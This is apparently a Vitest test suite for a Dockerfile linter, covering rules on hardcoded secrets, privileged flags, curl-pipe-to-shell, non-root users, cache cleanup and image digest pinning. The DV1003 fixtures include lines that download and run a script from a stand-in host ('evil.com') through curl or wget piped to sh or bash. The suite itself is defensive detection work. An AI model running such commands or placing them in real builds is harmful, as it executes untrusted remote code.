import { describe, it, expect } from 'vitest';
import { lintDockerfile, hasRule, defaultConfig } from '../helpers';

describe('DV1001 - Hardcoded secrets', () => {
  it('flags ENV with password', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV DB_PASSWORD=mysecret'), 'DV1001')).toBe(true);
  });
  it('flags ARG with secret', () => {
    expect(hasRule(lintDockerfile('ARG API_SECRET=abc123\nFROM ubuntu:20.04'), 'DV1001')).toBe(true);
  });
  it('flags ENV with token', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV AUTH_TOKEN=xyz'), 'DV1001')).toBe(true);
  });
  it('flags ENV with api_key', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV API_KEY=mykey'), 'DV1001')).toBe(true);
  });
  it('passes ENV with variable reference', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV DB_PASSWORD=$EXTERNAL_PASS'), 'DV1001')).toBe(false);
  });
  it('passes ARG without default', () => {
    expect(hasRule(lintDockerfile('ARG API_SECRET\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
  });
  it('passes normal ENV', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV NODE_ENV=production'), 'DV1001')).toBe(false);
  });
  it('passes _FILE suffix ENV (Docker secrets file path convention)', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV MINIO_ACCESS_KEY_FILE=access_key'), 'DV1001')).toBe(false);
  });
  it('passes _FILE suffix with multiple secret path ENVs', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV MINIO_SECRET_KEY_FILE=secret_key MINIO_ROOT_PASSWORD_FILE=secret_key'), 'DV1001')).toBe(false);
  });
  it('flags ARG with encryption_key (cal.com pattern)', () => {
    expect(hasRule(lintDockerfile('ARG CALENDSO_ENCRYPTION_KEY=secret\nFROM ubuntu:20.04'), 'DV1001')).toBe(true);
  });
  it('flags ENV with signing_key', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV JWT_SIGNING_KEY=mykey123'), 'DV1001')).toBe(true);
  });
  it('passes ARG encryption_key without default', () => {
    expect(hasRule(lintDockerfile('ARG ENCRYPTION_KEY\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
  });
  it('passes ARG with _FILE suffix', () => {
    expect(hasRule(lintDockerfile('ARG DB_PASSWORD_FILE=password\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
  });
});

describe('DV1002 - Privileged operations', () => {
  it('flags --privileged', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN --privileged echo hi'), 'DV1002')).toBe(true);
  });
  it('flags --cap-add', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN --cap-add SYS_ADMIN echo'), 'DV1002')).toBe(true);
  });
  it('passes normal RUN', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN echo hi'), 'DV1002')).toBe(false);
  });
});

describe('DV1003 - Unsafe curl pipe', () => {
  it('flags curl | sh', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/script.sh | sh'), 'DV1003')).toBe(true);
  });
  it('flags curl | bash', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/script.sh | bash'), 'DV1003')).toBe(true);
  });
  it('flags wget | sh', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN wget -O - https://evil.com/script.sh | sh'), 'DV1003')).toBe(true);
  });
  it('passes safe curl', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl -o /tmp/file.sh https://example.com/file.sh'), 'DV1003')).toBe(false);
  });
});

describe('DV1004 - Multi-stage build suggestion', () => {
  it('flags single stage with build tools', () => {
    expect(hasRule(lintDockerfile('FROM node:18\nRUN npm run build'), 'DV1004')).toBe(true);
  });
  it('passes multi-stage', () => {
    expect(hasRule(lintDockerfile('FROM node:18 AS builder\nRUN npm run build\nFROM nginx:alpine\nCOPY --from=builder /app/dist /usr/share/nginx/html'), 'DV1004')).toBe(false);
  });
  it('passes without build tools', () => {
    expect(hasRule(lintDockerfile('FROM node:18\nRUN echo hi'), 'DV1004')).toBe(false);
  });
});

describe('DV1005 - .dockerignore recommended', () => {
  it('flags COPY .', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY . /app'), 'DV1005')).toBe(true);
  });
  it('passes specific COPY', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY app.js /app/'), 'DV1005')).toBe(false);
  });
});

describe('DV1006 - Non-root user', () => {
  it('flags no USER instruction', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN echo hi'), 'DV1006')).toBe(true);
  });
  it('passes with USER', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nUSER nobody'), 'DV1006')).toBe(false);
  });
  it('skips distroless nonroot base images', () => {
    expect(hasRule(lintDockerfile('FROM gcr.io/distroless/static-debian13:nonroot\nCOPY app /app'), 'DV1006')).toBe(false);
  });
  it('skips nonroot tag variants', () => {
    expect(hasRule(lintDockerfile('FROM gcr.io/distroless/base-debian12:nonroot-amd64\nCOPY app /app'), 'DV1006')).toBe(false);
  });
  it('skips chainguard static base images', () => {
    expect(hasRule(lintDockerfile('FROM cgr.dev/chainguard/static@sha256:abc123\nCOPY app /app'), 'DV1006')).toBe(false);
  });
  it('resolves stage alias to original base image', () => {
    const df = 'FROM cgr.dev/chainguard/static@sha256:abc AS distroless_source\nFROM ubuntu AS builder\nRUN make\nFROM distroless_source\nCOPY --from=builder /app /app';
    expect(hasRule(lintDockerfile(df), 'DV1006')).toBe(false);
  });
  it('skips FROM scratch (no shell/passwd available)', () => {
    expect(hasRule(lintDockerfile('FROM scratch\nCOPY app /app\nCMD ["/app"]'), 'DV1006')).toBe(false);
  });
});

describe('DV1007 - Package manager cache not cleaned', () => {
  it('flags apt-get without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN apt-get install -y curl'), 'DV1007')).toBe(true);
  });
  it('passes apt-get with cleanup', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN apt-get install -y curl && rm -rf /var/lib/apt/lists/*'), 'DV1007')).toBe(false);
  });
  it('flags yum without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM centos:7\nRUN yum install -y curl'), 'DV1007')).toBe(true);
  });
  it('flags dnf without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM fedora:35\nRUN dnf install -y curl'), 'DV1007')).toBe(true);
  });
  it('flags microdnf without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM fedora:35\nRUN microdnf install -y curl'), 'DV1007')).toBe(true);
  });
  it('passes microdnf with cleanup', () => {
    expect(hasRule(lintDockerfile('FROM fedora:35\nRUN microdnf install -y curl && microdnf clean all'), 'DV1007')).toBe(false);
  });
});

describe('DV1008 - COPY . . too broad', () => {
  it('flags COPY . .', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY . .'), 'DV1008')).toBe(true);
  });
  it('flags COPY . /app', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY . /app'), 'DV1008')).toBe(true);
  });
  it('passes specific COPY', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY package.json /app/'), 'DV1008')).toBe(false);
  });
});

describe('DV1009 - Unpinned digest', () => {
  it('flags no digest', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04'), 'DV1009')).toBe(true);
  });
  it('passes with digest', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu@sha256:abc123'), 'DV1009')).toBe(false);
  });
  it('skips scratch', () => {
    expect(hasRule(lintDockerfile('FROM scratch'), 'DV1009')).toBe(false);
  });
  it('skips stage aliases', () => {
    expect(hasRule(lintDockerfile('FROM node:20 AS builder\nRUN npm ci\nFROM alpine:3.19\nCOPY --from=builder /app /app'), 'DV1009')).toBe(true);
    // The 'builder' stage reference should not trigger DV1009
    const df = 'FROM node:20 AS builder\nRUN npm ci\nFROM builder';
    const results = lintDockerfile(df);
    const dv1009 = results.filter(r => r.rule === 'DV1009');
    expect(dv1009.length).toBe(1); // only node:20, not builder
    expect(dv1009[0].message).toContain('node');
  });
  it('skips ARG variable references', () => {
    const df = 'ARG BASE_IMAGE=ubuntu:20.04\nFROM ${BASE_IMAGE}';
    expect(hasRule(lintDockerfile(df), 'DV1009')).toBe(false);
  });
  it('skips $VAR without braces', () => {
    const df = 'ARG IMG=node:20\nFROM $IMG';
    expect(hasRule(lintDockerfile(df), 'DV1009')).toBe(false);
  });
  it('skips Jinja2 template variables', () => {
    const df = 'FROM {{ base_image }}:{{ version }}';
    expect(hasRule(lintDockerfile(df), 'DV1009')).toBe(false);
  });
});
